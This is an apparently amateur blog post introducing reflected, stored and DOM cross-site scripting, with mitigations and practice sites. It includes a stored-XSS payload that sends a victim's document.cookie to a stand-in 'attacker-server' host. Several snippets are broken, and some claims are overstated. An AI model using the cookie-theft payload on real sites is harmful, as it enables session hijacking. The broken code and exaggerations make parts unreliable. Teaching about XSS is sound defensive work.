---
title: Cross-site Scripting - known as XSS
date: 2021-06-01 18:28:16
tags: [XSS, Cross-site Scripting, Web Security]
---

## 1. Introduction

Cross-site scripting is an attack where some software applications take user's input in an insecure way. This happens via search fields in the web page, survey forms, cookies and other online web forms.

## 2. Reflected XSS

1. The website's results contain malicious scripts.

2. when attacker gives your web application JavaScript tags on input.

   ```html
   <script type="text/javascript">
     alert('Possible XSS');
   </script>
   ```

3. When the above script is returned to the user, browser will execute it, and I can be as simple as crafting a link and inducing a user to click it, which could cause much more dangerous.

## 3. Stored XSS

1. The malicious data is stored permanently on a database and is later accessed and run by the victims without having any knowledge of the attack. The classic example of stored XSS is a malicious scripted inserted by an attacker in a comment field on a blog, Social media, or in a forum post.

2. The script below attempts to load an image from the attacker's server with the victim's cookie data within the request URL.

   ```html
   <script>var+img=new+image();img.src='http://attacker-server/'+document.cookie;</script>
   ```

3. After a request for the image has taken place the attacker can extract the victim's session identifier from the webserver log files.
4. the most famous stored XSS bug was Samy worm which killed Myspace!!

## 4. DOM XSS

1. DOM stands for Document Object Model of the page. 

2. The script below is an example. DOM based XSS where in attacker's payload is executed as a result of modifying the DOM 'environment' in the victims' browser used by the original client-side script so that the client side code runs in an unexpected manner.

   ``` html
   <script>document.write("<b>Current URL</b>" : " document.baseURL);</script>
   ```

## 5. Mitigation of XSS

### Input validation

- We can take parameter from URL or data from text and limit the user Input by using known blacklist. It is difficult to add because everyday hackers coming up with different Polyglots. 

#### Output encoding 

- It is changing input so that it cannot be interpreted as code
- Some HTML encoding rules: 
  - ", &, <, >
- URL encoding/ percent encoding

#### Enable CSP

- Content Security Policy is set by application server to the browser's policy
- Set CSP via HTTP header by the web server

#### Use HTTP only Flag

- set http-only via Set-Cookie HTTP response header

## 6. Some site for learning CSS 

1. Google XSS Game
2. DVWA
3. Burp Academy
4. Pen-tester Lab